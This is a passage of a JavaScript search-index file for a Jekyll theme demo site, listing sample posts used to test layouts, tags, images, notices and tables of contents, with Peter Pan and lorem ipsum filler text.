var store = [{
        "title": "Edge Case: Nested and Mixed Lists",
        "excerpt":"Nested and mixed lists are an interesting beast. It’s a corner case to make sure that      Lists within lists do not break the ordered list numbering order   Your list styles go deep enough.   Ordered – Unordered – Ordered      ordered item   ordered item            unordered       unordered                 ordered item       ordered item           ordered item   ordered item   Ordered – Unordered – Unordered      ordered item   ordered item            unordered       unordered                 unordered item       unordered item           ordered item   ordered item   Unordered – Ordered – Unordered      unordered item   unordered item            ordered       ordered                    unordered item           unordered item                           unordered item   unordered item   Unordered – Unordered – Ordered      unordered item   unordered item            unordered       unordered                    ordered item           ordered item                           unordered item   unordered item   Task Lists      Finish my changes   Push my commits to GitHub   Open a pull request            Follow discussions       Push new commits          ","categories": ["Edge Case"],
        "tags": ["content","css","edge case","lists","markup"],
        "url": "https://zjgcjy.github.io/origin/2009-05-15-edge-case-nested-and-mixed-lists/",
        "teaser":null},{
        "title": "Edge Case: Many Tags",
        "excerpt":"This post has many tags.  ","categories": ["Edge Case"],
        "tags": ["8BIT","alignment","Articles","captions","categories","chat","comments","content","css","dowork","edge case","embeds","excerpt","Fail","featured image","FTW","Fun","gallery","html","image","Jekyll","layout","link","Love","markup","Mothership","Must Read","Nailed It","Pictures","Post Formats","quote","standard","Success","Swagger","Tags","template","title","twitter","Unseen","video","YouTube","U:R:COOL","C#"],
        "url": "https://zjgcjy.github.io/origin/2009-06-01-edge-case-many-tags/",
        "teaser":null},{
        "title": "Edge Case: Many Categories",
        "excerpt":"This post has many categories.  ","categories": ["aciform","antiquarianism","arrangement","asmodeus","broder","buying","championship","chastening","disinclination","disinfection","dispatch","echappee","enphagy"],
        "tags": ["categories","edge case"],
        "url": "https://zjgcjy.github.io/origin/2009-07-02-edge-case-many-categories/",
        "teaser":null},{
        "title": "Edge Case: No Body Content",
        "excerpt":" ","categories": ["Edge Case"],
        "tags": ["content","edge case","layout"],
        "url": "https://zjgcjy.github.io/origin/2009-08-06-edge-case-no-body-content/",
        "teaser":null},{
        "title": "Edge Case No Yaml Title",
        "excerpt":"This post has no title specified in the YAML Front Matter. Jekyll should auto-generate a title from the filename.  ","categories": ["Edge Case"],
        "tags": ["edge case","layout","title"],
        "url": "https://zjgcjy.github.io/origin/2009-09-05-edge-case-no-yaml-title/",
        "teaser":null},{
        "title": "Antidisestablishmentarianism",
        "excerpt":"Title should not overflow the content area   A few things to check for:      Non-breaking text in the title, content, and comments should have no adverse effects on layout or functionality.   Check the browser window / tab title.   If you are a theme developer, check that this text does not break anything.   The following CSS properties will help you support non-breaking text.   -ms-word-wrap: break-word; word-wrap: break-word;  ","categories": ["Edge Case"],
        "tags": ["content","css","edge case","html","layout","title"],
        "url": "https://zjgcjy.github.io/origin/2009-10-05-edge-case-title-should-not-overflow-the-content-area/",
        "teaser":null},{
        "title": "Suspicio? Bene ... tunc ibimus? Quis uh ... CONEXUS locus his diebus? Quisque semper aliquid videtur, in volutpat mauris. Nolo enim dicere. Vobis neque ab aliis. Ego feci memetipsum explicans. Gus mortuus est. Lorem opus habeo. Jackson Isai? Tu quoque ... A te quidem a ante. Vos scitis quod blinking res Ive 'been vocans super vos? Et conteram illud, et conteram hoc. Maledicant druggie excors. Iam hoc tu facere conatus sum ad te in omni tempore? Ludum mutavit. Verbum est ex. Et ... sunt occid",
        "excerpt":"Check for long titles and how they might break a template.  ","categories": ["Edge Case"],
        "tags": ["content","css","edge case","html","layout","title"],
        "url": "https://zjgcjy.github.io/origin/2009-10-05-edge-case-very-long-title/",
        "teaser":null},{
        "title": "Post: Modified Date",
        "excerpt":"This post has been updated and should show a modified date if used in a layout.   All children, except one, grow up. They soon know that they will grow up, and the way Wendy knew was this. One day when she was two years old she was playing in a garden, and she plucked another flower and ran with it to her mother. I suppose she must have looked rather delightful, for Mrs. Darling put her hand to her heart and cried, “Oh, why can’t you remain like this for ever!” This was all that passed between them on the subject, but henceforth Wendy knew that she must grow up. You always know after you are two. Two is the beginning of the end.  ","categories": ["Post Formats"],
        "tags": ["Post Formats","readability","standard"],
        "url": "https://zjgcjy.github.io/origin/2010-01-07-post-modified/",
        "teaser":null},{
        "title": "Post: Standard",
        "excerpt":"All children, except one, grow up. They soon know that they will grow up, and the way Wendy knew was this. One day when she was two years old she was playing in a garden, and she plucked another flower and ran with it to her mother. I suppose she must have looked rather delightful, for Mrs. Darling put her hand to her heart and cried, “Oh, why can’t you remain like this for ever!” This was all that passed between them on the subject, but henceforth Wendy knew that she must grow up. You always know after you are two. Two is the beginning of the end.   Mrs. Darling first heard of Peter when she was tidying up her children’s minds. It is the nightly custom of every good mother after her children are asleep to rummage in their minds and put things straight for next morning, repacking into their proper places the many articles that have wandered during the day.     This post has a manual excerpt &lt;!--more--&gt; set after the second paragraph. The following YAML Front Matter has also be applied:   excerpt_separator: \"&lt;!--more--&gt;\"   If you could keep awake (but of course you can’t) you would see your own mother doing this, and you would find it very interesting to watch her. It is quite like tidying up drawers. You would see her on her knees, I expect, lingering humorously over some of your contents, wondering where on earth you had picked this thing up, making discoveries sweet and not so sweet, pressing this to her cheek as if it were as nice as a kitten, and hurriedly stowing that out of sight. When you wake in the morning, the naughtiness and evil passions with which you went to bed have been folded up small and placed at the bottom of your mind and on the top, beautifully aired, are spread out your prettier thoughts, ready for you to put on.   I don’t know whether you have ever seen a map of a person’s mind. Doctors sometimes draw maps of other parts of you, and your own map can become intensely interesting, but catch them trying to draw a map of a child’s mind, which is not only confused, but keeps going round all the time. There are zigzag lines on it, just like your temperature on a card, and these are probably roads in the island, for the Neverland is always more or less an island, with astonishing splashes of colour here and there, and coral reefs and rakish-looking craft in the offing, and savages and lonely lairs, and gnomes who are mostly tailors, and caves through which a river runs, and princes with six elder brothers, and a hut fast going to decay, and one very small old lady with a hooked nose. It would be an easy map if that were all, but there is also first day at school, religion, fathers, the round pond, needle-work, murders, hangings, verbs that take the dative, chocolate pudding day, getting into braces, say ninety-nine, three-pence for pulling out your tooth yourself, and so on, and either these are part of the island or they are another map showing through, and it is all rather confusing, especially as nothing will stand still.   Of course the Neverlands vary a good deal. John’s, for instance, had a lagoon with flamingoes flying over it at which John was shooting, while Michael, who was very small, had a flamingo with lagoons flying over it. John lived in a boat turned upside down on the sands, Michael in a wigwam, Wendy in a house of leaves deftly sewn together. John had no friends, Michael had friends at night, Wendy had a pet wolf forsaken by its parents, but on the whole the Neverlands have a family resemblance, and if they stood still in a row you could say of them that they have each other’s nose, and so forth. On these magic shores children at play are for ever beaching their coracles [simple boat]. We too have been there; we can still hear the sound of the surf, though we shall land no more.   Of all delectable islands the Neverland is the snuggest and most compact, not large and sprawly, you know, with tedious distances between one adventure and another, but nicely crammed. When you play at it by day with the chairs and table-cloth, it is not in the least alarming, but in the two minutes before you go to sleep it becomes very real. That is why there are night-lights.   Occasionally in her travels through her children’s minds Mrs. Darling found things she could not understand, and of these quite the most perplexing was the word Peter. She knew of no Peter, and yet he was here and there in John and Michael’s minds, while Wendy’s began to be scrawled all over with him. The name stood out in bolder letters than any of the other words, and as Mrs. Darling gazed she felt that it had an oddly cocky appearance.  ","categories": ["Post Formats"],
        "tags": ["Post Formats","readability","standard"],
        "url": "https://zjgcjy.github.io/origin/2010-01-07-post-standard/",
        "teaser":null},{
        "title": "Post: Chat",
        "excerpt":"Abbott: Strange as it may seem, they give ball players nowadays very peculiar names.   Costello: Funny names?   Abbott: Nicknames, nicknames. Now, on the St. Louis team we have Who’s on first, What’s on second, I Don’t Know is on third–   Costello: That’s what I want to find out. I want you to tell me the names of the fellows on the St. Louis team.   Abbott: I’m telling you. Who’s on first, What’s on second, I Don’t Know is on third–   Costello: You know the fellows’ names?   Abbott: Yes.   Costello: Well, then who’s playing first?   Abbott: Yes.   Costello: I mean the fellow’s name on first base.   Abbott: Who.   Costello: The fellow playin’ first base.   Abbott: Who.   Costello: The guy on first base.   Abbott: Who is on first.   Costello: Well, what are you askin’ me for?   Abbott: I’m not asking you–I’m telling you. Who is on first.   Costello: I’m asking you–who’s on first?   Abbott: That’s the man’s name.   Costello: That’s who’s name?   Abbott: Yes.   Costello: When you pay off the first baseman every month, who gets the money?   Abbott: Every dollar of it. And why not, the man’s entitled to it.   Costello: Who is?   Abbott: Yes.   Costello: So who gets it?   Abbott: Why shouldn’t he? Sometimes his wife comes down and collects it.   Costello: Who’s wife?   Abbott: Yes. After all, the man earns it.   Costello: Who does?   Abbott: Absolutely.   Costello: Well, all I’m trying to find out is what’s the guy’s name on first base?   Abbott: Oh, no, no. What is on second base.   Costello: I’m not asking you who’s on second.   Abbott: Who’s on first!   Costello: St. Louis has a good outfield?   Abbott: Oh, absolutely.   Costello: The left fielder’s name?   Abbott: Why.   Costello: I don’t know, I just thought I’d ask.   Abbott: Well, I just thought I’d tell you.   Costello: Then tell me who’s playing left field?   Abbott: Who’s playing first.   Costello: Stay out of the infield! The left fielder’s name?   Abbott: Why.   Costello: Because.   Abbott: Oh, he’s center field.   Costello: Wait a minute. You got a pitcher on this team?   Abbott: Wouldn’t this be a fine team without a pitcher?   Costello: Tell me the pitcher’s name.   Abbott: Tomorrow.   Costello: Now, when the guy at bat bunts the ball–me being a good catcher–I want to throw the guy out at first base, so I pick up the ball and throw it to who?   Abbott: Now, that’s he first thing you’ve said right.   Costello: I DON’T EVEN KNOW WHAT I’M TALKING ABOUT!   Abbott: Don’t get excited. Take it easy.   Costello: I throw the ball to first base, whoever it is grabs the ball, so the guy runs to second. Who picks up the ball and throws it to what. What throws it to I don’t know. I don’t know throws it back to tomorrow–a triple play.   Abbott: Yeah, it could be.   Costello: Another guy gets up and it’s a long ball to center.   Abbott: Because.   Costello: Why? I don’t know. And I don’t care.   Abbott: What was that?   Costello: I said, I DON’T CARE!   Abbott: Oh, that’s our shortstop!  ","categories": ["Post Formats"],
        "tags": ["chat","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-01-08-post-chat/",
        "teaser":null},{
        "title": "Post: Notice",
        "excerpt":"A notice displays information that explains nearby content. Often used to call attention to a particular detail.   When using Kramdown {: .notice} can be added after a sentence to assign the .notice to the &lt;p&gt;&lt;/p&gt; element.   Changes in Service: We just updated our privacy policy here to better service our customers. We recommend reviewing the changes.   Primary Notice: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.      Primary Notice with code block: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.     &lt;html&gt;   &lt;body&gt;Some body.&lt;body&gt; &lt;/html&gt;      Info Notice: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.   Warning Notice: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.   Danger Notice: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.   Success Notice: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer nec odio. Praesent libero. Sed cursus ante dapibus diam. Sed nisi. Nulla quis sem at nibh elementum imperdiet.   Want to wrap several paragraphs or other elements in a notice? Using Liquid to capture the content and then filter it with markdownify is a good way to go.   {% capture notice-2 %} #### New Site Features  * You can now have cover images on blog pages * Drafts will now auto-save while writing {% endcapture %}  &lt;div class=\"notice\"&gt;{{ notice-2 | markdownify }}&lt;/div&gt;       New Site Features      You can now have cover images on blog pages   Drafts will now auto-save while writing     Or you could skip the capture and stick with straight HTML.   &lt;div class=\"notice\"&gt;   &lt;h4&gt;Message&lt;/h4&gt;   &lt;p&gt;A basic message.&lt;/p&gt; &lt;/div&gt;      Message    A basic message.   ","categories": ["Post Formats"],
        "tags": ["Post Formats","notice"],
        "url": "https://zjgcjy.github.io/origin/2010-02-05-post-notice/",
        "teaser":null},{
        "title": "Post: Quote",
        "excerpt":"   Only one thing is impossible for God: To find any sense in any copyright law on the planet.       Mark Twain   ","categories": ["Post Formats"],
        "tags": ["Post Formats","quote"],
        "url": "https://zjgcjy.github.io/origin/2010-02-05-post-quote/",
        "teaser":null},{
        "title": "Post: Link",
        "excerpt":"This theme supports link posts, made famous by John Gruber. To use, just add link: http://url-you-want-linked to the post’s YAML front matter and you’re done.      And this is how a quote looks.    Some link can also be shown.  ","categories": ["Post Formats"],
        "tags": ["link","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-03-07-post-link/",
        "teaser":null},{
        "title": "Post: Video (YouTube)",
        "excerpt":"YouTube video embed below.    ","categories": ["Post Formats"],
        "tags": ["Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-06-02-post-video-youtube/",
        "teaser":null},{
        "title": "Post: Header Image with OpenGraph Override",
        "excerpt":"This post has a header image with an OpenGraph override.   header:   image: /assets/images/page-header-image.png   og_image: /assets/images/page-header-og-image.png  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2010-08-05-post-header-image-og-override/",
        "teaser":null},{
        "title": "Post: Overlay Image with OpenGraph Override",
        "excerpt":"This post has a header image with an OpenGraph override.   header:   overlay_image: /assets/images/unsplash-image-1.jpg   og_image: /assets/images/page-header-og-image.png   caption: \"Photo credit: [**Unsplash**](https://unsplash.com)\"   actions:     - label: \"Learn More\"       url: \"https://unsplash.com\"  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2010-08-05-post-header-overlay-image-og-override/",
        "teaser":null},{
        "title": "Post: Image (with Link)",
        "excerpt":"  ","categories": ["Post Formats"],
        "tags": ["image","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-08-05-post-image-linked/",
        "teaser":null},{
        "title": "Post: Image (Standard)",
        "excerpt":"The preferred way of using images is placing them in the /assets/images/ directory and referencing them with an absolute path. Prepending the filename with {{ site.url }}{{ site.baseurl }}/assets/images/ will make sure your images display properly in feeds and such.   Standard image with no width modifier classes applied.   HTML:   &lt;img src=\"{{ site.url }}{{ site.baseurl }}/assets/images/filename.jpg\" alt=\"\"&gt;   or Kramdown:   ![alt]({{ site.url }}{{ site.baseurl }}/assets/images/filename.jpg)      Image that fills page content container by adding the .full class with:   HTML:   &lt;img src=\"{{ site.url }}{{ site.baseurl }}/assets/images/filename.jpg\" alt=\"\" class=\"full\"&gt;   or Kramdown:   ![alt]({{ site.url }}{{ site.baseurl }}/assets/images/filename.jpg) {: .full}     ","categories": ["Post Formats"],
        "tags": ["image","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-08-05-post-image-standard/",
        "teaser":null},{
        "title": "Post: Teaser Image with OpenGraph Override",
        "excerpt":"This post has a teaser image with an OpenGraph override.   header:   teaser: /assets/images/page-header-teaser.png   og_image: /assets/images/page-header-og-image.png  ","categories": ["Layout","Uncategorized"],
        "tags": ["edge case","image","layout"],
        "url": "https://zjgcjy.github.io/origin/2010-08-05-post-teaser-image-og-override/",
        "teaser":"https://zjgcjy.github.io/assets/images/page-header-teaser.png"},{
        "title": "Post: Image (Linked with Caption)",
        "excerpt":"          Stairs? Were we’re going we don’t need no stairs.   ","categories": ["Post Formats"],
        "tags": ["image","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-08-06-post-image-linked-caption/",
        "teaser":null},{
        "title": "Post: Image (Caption)",
        "excerpt":"         Photo from Unsplash.  ","categories": ["Post Formats"],
        "tags": ["image","Post Formats"],
        "url": "https://zjgcjy.github.io/origin/2010-08-07-post-image-caption/",
        "teaser":null},{
        "title": "Post: Gallery",
        "excerpt":"These are gallery tests for image wrapped in &lt;figure&gt; elements.   To place a gallery add the necessary YAML Front Matter:   gallery:   - url: /assets/images/unsplash-gallery-image-1.jpg     image_path: /assets/images/unsplash-gallery-image-1-th.jpg     alt: \"placeholder image 1\"     title: \"Image 1 title caption\"   - url: /assets/images/unsplash-gallery-image-2.jpg     image_path: /assets/images/unsplash-gallery-image-2-th.jpg     alt: \"placeholder image 2\"     title: \"Image 2 title caption\"   - url: /assets/images/unsplash-gallery-image-3.jpg     image_path: /assets/images/unsplash-gallery-image-3-th.jpg     alt: \"placeholder image 3\"     title: \"Image 3 title caption\"   - url: /assets/images/unsplash-gallery-image-4.jpg     image_path: /assets/images/unsplash-gallery-image-4-th.jpg     alt: \"placeholder image 4\"     title: \"Image 4 title caption\"   And then drop-in the gallery include — gallery caption is optional.   {% include gallery caption=\"This is a sample gallery with **Markdown support**.\" %}                                                                                                                                                                                                                                                                                                                                                                                                                                                              This is a sample gallery with Markdown support.       This is some text after the gallery just to make sure that everything aligns properly.   Here comes another gallery, this time set the id to match 2nd gallery hash in YAML Front Matter.   gallery2:   - url: https://flic.kr/p/8a6Ven     image_path: https://farm2.staticflickr.com/1272/4697500467_8294dac099_q.jpg     alt: \"Black and grays with a hint of green\"   - url: https://flic.kr/p/8a738X     image_path: https://farm5.staticflickr.com/4029/4697523701_249e93ba23_q.jpg     alt: \"Made for open text placement\"   - url: https://flic.kr/p/8a6VXP     image_path: https://farm5.staticflickr.com/4046/4697502929_72c612c636_q.jpg     alt: \"Fog in the trees\"   And place it like so:   {% include gallery id=\"gallery2\" caption=\"This is a second gallery example with images hosted externally.\" %}                                                                                                                          This is a second gallery example with images hosted externally.       And for giggles one more gallery just to make sure this works. To fill page content container add class=\"full\".                                                      This is a third gallery example with two images and fills the entire content container.       Gallery column layout can be overrided by setting a layout.   {% include gallery id=\"gallery\" layout=\"half\" caption=\"This is a half gallery layout example.\" %}                                                                                                                                                                                                                                                                                                                                                                                                                                                              This is a half gallery layout example.      ","categories": ["Post Formats"],
        "tags": ["gallery","Post Formats","tiled"],
        "url": "https://zjgcjy.github.io/origin/2010-09-09-post-gallery/",
        "teaser":null},{
        "title": "Post: Twitter Embed",
        "excerpt":"🎨 Finally got around to adding all my @procreateapp creations with time lapse videos https://t.co/1nNbkefC3L pic.twitter.com/gcNLJoJ0Gn &mdash; Michael Rose (@mmistakes) November 6, 2015   This post tests Twitter Embeds.  ","categories": ["Media"],
        "tags": ["content","embeds","media","twitter"],
        "url": "https://zjgcjy.github.io/origin/2010-09-10-post-twitter-embeds/",
        "teaser":null},{
        "title": "Layout: Comments Disabled",
        "excerpt":"This post has its comments disabled.   There should be no comment form.  ","categories": ["Layout","Uncategorized"],
        "tags": ["comments","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-comments-disabled/",
        "teaser":null},{
        "title": "Layout: Comments Enabled",
        "excerpt":"This post should display comments.  ","categories": ["Layout","Uncategorized"],
        "tags": ["comments","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-comments/",
        "teaser":null},{
        "title": "Layout: Read Time Disabled",
        "excerpt":"This post has reading time disabled. The estimated time that it takes to read this post should not be showing if read_time: false is set in _config.yml or in this post’s YAML Front Matter.   If you could keep awake (but of course you can’t) you would see your own mother doing this, and you would find it very interesting to watch her. It is quite like tidying up drawers. You would see her on her knees, I expect, lingering humorously over some of your contents, wondering where on earth you had picked this thing up, making discoveries sweet and not so sweet, pressing this to her cheek as if it were as nice as a kitten, and hurriedly stowing that out of sight. When you wake in the morning, the naughtiness and evil passions with which you went to bed have been folded up small and placed at the bottom of your mind and on the top, beautifully aired, are spread out your prettier thoughts, ready for you to put on.   I don’t know whether you have ever seen a map of a person’s mind. Doctors sometimes draw maps of other parts of you, and your own map can become intensely interesting, but catch them trying to draw a map of a child’s mind, which is not only confused, but keeps going round all the time. There are zigzag lines on it, just like your temperature on a card, and these are probably roads in the island, for the Neverland is always more or less an island, with astonishing splashes of colour here and there, and coral reefs and rakish-looking craft in the offing, and savages and lonely lairs, and gnomes who are mostly tailors, and caves through which a river runs, and princes with six elder brothers, and a hut fast going to decay, and one very small old lady with a hooked nose. It would be an easy map if that were all, but there is also first day at school, religion, fathers, the round pond, needle-work, murders, hangings, verbs that take the dative, chocolate pudding day, getting into braces, say ninety-nine, three-pence for pulling out your tooth yourself, and so on, and either these are part of the island or they are another map showing through, and it is all rather confusing, especially as nothing will stand still.   Of course the Neverlands vary a good deal. John’s, for instance, had a lagoon with flamingoes flying over it at which John was shooting, while Michael, who was very small, had a flamingo with lagoons flying over it. John lived in a boat turned upside down on the sands, Michael in a wigwam, Wendy in a house of leaves deftly sewn together. John had no friends, Michael had friends at night, Wendy had a pet wolf forsaken by its parents, but on the whole the Neverlands have a family resemblance, and if they stood still in a row you could say of them that they have each other’s nose, and so forth. On these magic shores children at play are for ever beaching their coracles [simple boat]. We too have been there; we can still hear the sound of the surf, though we shall land no more.   Of all delectable islands the Neverland is the snuggest and most compact, not large and sprawly, you know, with tedious distances between one adventure and another, but nicely crammed. When you play at it by day with the chairs and table-cloth, it is not in the least alarming, but in the two minutes before you go to sleep it becomes very real. That is why there are night-lights.   Occasionally in her travels through her children’s minds Mrs. Darling found things she could not understand, and of these quite the most perplexing was the word Peter. She knew of no Peter, and yet he was here and there in John and Michael’s minds, while Wendy’s began to be scrawled all over with him. The name stood out in bolder letters than any of the other words, and as Mrs. Darling gazed she felt that it had an oddly cocky appearance.  ","categories": [],
        "tags": ["read time"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-read-time-disabled/",
        "teaser":null},{
        "title": "Layout: Read Time Enabled",
        "excerpt":"This post has reading time enabled. The estimated time that it takes to read this post should show if also enabled in _config.yml with read_time: true.   If you could keep awake (but of course you can’t) you would see your own mother doing this, and you would find it very interesting to watch her. It is quite like tidying up drawers. You would see her on her knees, I expect, lingering humorously over some of your contents, wondering where on earth you had picked this thing up, making discoveries sweet and not so sweet, pressing this to her cheek as if it were as nice as a kitten, and hurriedly stowing that out of sight. When you wake in the morning, the naughtiness and evil passions with which you went to bed have been folded up small and placed at the bottom of your mind and on the top, beautifully aired, are spread out your prettier thoughts, ready for you to put on.   I don’t know whether you have ever seen a map of a person’s mind. Doctors sometimes draw maps of other parts of you, and your own map can become intensely interesting, but catch them trying to draw a map of a child’s mind, which is not only confused, but keeps going round all the time. There are zigzag lines on it, just like your temperature on a card, and these are probably roads in the island, for the Neverland is always more or less an island, with astonishing splashes of colour here and there, and coral reefs and rakish-looking craft in the offing, and savages and lonely lairs, and gnomes who are mostly tailors, and caves through which a river runs, and princes with six elder brothers, and a hut fast going to decay, and one very small old lady with a hooked nose. It would be an easy map if that were all, but there is also first day at school, religion, fathers, the round pond, needle-work, murders, hangings, verbs that take the dative, chocolate pudding day, getting into braces, say ninety-nine, three-pence for pulling out your tooth yourself, and so on, and either these are part of the island or they are another map showing through, and it is all rather confusing, especially as nothing will stand still.   Of course the Neverlands vary a good deal. John’s, for instance, had a lagoon with flamingoes flying over it at which John was shooting, while Michael, who was very small, had a flamingo with lagoons flying over it. John lived in a boat turned upside down on the sands, Michael in a wigwam, Wendy in a house of leaves deftly sewn together. John had no friends, Michael had friends at night, Wendy had a pet wolf forsaken by its parents, but on the whole the Neverlands have a family resemblance, and if they stood still in a row you could say of them that they have each other’s nose, and so forth. On these magic shores children at play are for ever beaching their coracles [simple boat]. We too have been there; we can still hear the sound of the surf, though we shall land no more.   Of all delectable islands the Neverland is the snuggest and most compact, not large and sprawly, you know, with tedious distances between one adventure and another, but nicely crammed. When you play at it by day with the chairs and table-cloth, it is not in the least alarming, but in the two minutes before you go to sleep it becomes very real. That is why there are night-lights.   Occasionally in her travels through her children’s minds Mrs. Darling found things she could not understand, and of these quite the most perplexing was the word Peter. She knew of no Peter, and yet he was here and there in John and Michael’s minds, while Wendy’s began to be scrawled all over with him. The name stood out in bolder letters than any of the other words, and as Mrs. Darling gazed she felt that it had an oddly cocky appearance.  ","categories": [],
        "tags": ["read time"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-read-time/",
        "teaser":null},{
        "title": "Layout: Related Posts Disabled",
        "excerpt":"This post has related posts disabled.   Related post links should not appear.  ","categories": ["Layout","Uncategorized"],
        "tags": ["related posts","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-related-posts-disabled/",
        "teaser":null},{
        "title": "Layout: Related Posts Enabled",
        "excerpt":"This post has related posts enabled.  ","categories": ["Layout","Uncategorized"],
        "tags": ["related posts","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-related-posts/",
        "teaser":null},{
        "title": "Layout: Social Sharing Links Disabled",
        "excerpt":"This post has social sharing disabled.   Social sharing links should not appear.  ","categories": ["Layout","Uncategorized"],
        "tags": ["social","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-sharing-disabled/",
        "teaser":null},{
        "title": "Layout: Social Sharing Links Enabled",
        "excerpt":"This post should display social sharing links.  ","categories": ["Layout","Uncategorized"],
        "tags": ["social","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-02-layout-sharing/",
        "teaser":null},{
        "title": "Layout: Reading Time, Comments, Social Sharing Links, and Related Posts Disabled",
        "excerpt":"This post has reading time, comments, social sharing links, and related posts disabled.   Reading time, comments, social sharing and related post links should not appear.  ","categories": ["Layout","Uncategorized"],
        "tags": ["related posts","social","comments","layout"],
        "url": "https://zjgcjy.github.io/origin/2012-01-03-layout-read-time-comments-sharing-related-posts-disabled/",
        "teaser":null},{
        "title": "Layout: Post with Nested Table of Contents via Helper",
        "excerpt":"Tests table of contents with multiple levels to verify indentation is readible via helper include (deprecated).   {% include toc %}          On this page     Enim laboris id ea elit elit deserunt           2 Sit adipisicing tempor duis velit cupidatat occaecat do amet                   2.1 Ex et quis exercitation fugiat excepteur eiusmod mollit consequat id pariatur non adipisicing magna tempor                           2.1.1 Ut nostrud reprehenderit proident culpa enim irure cupidatat sunt ex ea minim nostrud               2.1.2 Nisi non nisi ullamco ipsum cillum               2.1.3 Ut pariatur do do eiusmod consequat do pariatur nisi ex anim reprehenderit nostrud                                   2.1.1.1 Ut aute quis ipsum fugiat dolor                   2.1.1.2 Consequat nostrud quis officia et aliquip quis magna mollit veniam                                           2.1.1.1.1 Id cillum proident labore occaecat reprehenderit excepteur fugiat est                       2.1.1.1.2 In consectetur ea qui quis culpa nulla                       2.1.1.1.3 Culpa magna pariatur magna officia adipisicing ex minim ea do est                       2.1.1.1.4 Veniam ipsum non reprehenderit pariatur                                                           2.1.1.3 Ut qui labore officia ad laboris eu amet minim tempor qui cupidatat duis aute                   2.1.1.4 Magna ipsum nisi velit anim                                           2.1.1.4.1 Mollit nulla est tempor fugiat occaecat nostrud                       2.1.1.2.1 Culpa aliquip irure et nostrud esse consequat fugiat dolor                                                                                       2.1.4 Laboris exercitation nisi tempor dolore                                   2.2 Officia irure duis et est sunt                       3 Laborum eu magna proident proident tempor                   3.1 Amet enim do laboris ipsum aliqua eiusmod non eu           3.2 Do exercitation ex elit incididunt sit cupidatat           3.3 Officia aliquip fugiat ex pariatur nisi et nostrud adipisicing eu minim laboris eiusmod ea sunt           3.4 Ipsum velit laborum est nostrud qui enim ullamco velit dolor Lorem magna           3.5 Officia fugiat fugiat voluptate ullamco eiusmod duis minim aliqua consequat consectetur qui do sunt fugiat                           3.5.1 Mollit laborum ea aliquip mollit quis commodo fugiat tempor deserunt exercitation sint culpa ipsum tempor                                   3.5.1.1 Nisi anim commodo consequat quis amet                                           3.5.1.1.1 Culpa nulla Lorem adipisicing ut sit cupidatat laborum laborum cupidatat proident                                                                                                           3.6 Reprehenderit culpa consectetur veniam minim cillum in nostrud                       4 Laboris aute consequat id eu et Lorem amet       5 Esse eu consequat consequat aliqua fugiat nulla ad labore consectetur eu pariatur nisi aute       6 Aliquip sunt laborum excepteur cupidatat officia ad tempor veniam esse amet ea commodo sunt                Enim laboris id ea elit elit deserunt   Magna incididunt elit id enim nisi quis excepteur reprehenderit Lorem dolore dolore ad enim. Labore esse elit excepteur et elit dolor. Elit ut consectetur labore velit elit esse voluptate id commodo. Magna cillum officia consequat non occaecat mollit esse nisi quis.   Nostrud veniam excepteur commodo enim pariatur velit est. Dolor consequat elit occaecat enim veniam ullamco qui est anim ex elit. Est minim aute magna laborum reprehenderit magna reprehenderit ullamco voluptate id sit aliqua. Id labore veniam ad duis aliquip commodo qui ex ut ipsum irure. In et sit ea cupidatat consectetur in nisi amet in cupidatat excepteur commodo amet.   2 Sit adipisicing tempor duis velit cupidatat occaecat do amet   Ad non dolore irure in. In do ut nostrud reprehenderit consequat aliqua sunt culpa voluptate amet minim ea. Eu dolore deserunt consectetur eu in minim sit nulla id id est amet consectetur. Tempor dolore ipsum magna amet velit aliquip ea anim non eu Lorem deserunt. Irure excepteur id adipisicing elit dolor ipsum eiusmod non nulla nisi sint qui et. Occaecat pariatur tempor ex nisi pariatur.   Proident culpa nostrud id est qui fugiat duis aute. Cillum commodo pariatur nostrud culpa Lorem exercitation non. Consequat elit deserunt dolore voluptate sunt labore minim ut consequat minim.   Sunt pariatur in ex non nulla proident ex ullamco Lorem do ipsum. Cillum est mollit reprehenderit excepteur labore labore elit dolore adipisicing ad quis quis aliqua sunt. Proident amet est reprehenderit deserunt amet cupidatat incididunt irure est elit.   2.1 Ex et quis exercitation fugiat excepteur eiusmod mollit consequat id pariatur non adipisicing magna tempor   Nostrud sunt nostrud incididunt adipisicing officia esse minim irure duis dolore adipisicing cupidatat. Eu non labore veniam ad sunt pariatur qui. Irure reprehenderit qui elit duis cillum sit officia consectetur sint deserunt do aute velit. Do id occaecat magna occaecat reprehenderit veniam pariatur Lorem. Officia sit cupidatat adipisicing laborum.   2.1.1 Ut nostrud reprehenderit proident culpa enim irure cupidatat sunt ex ea minim nostrud   Laborum laboris et ut proident sit qui 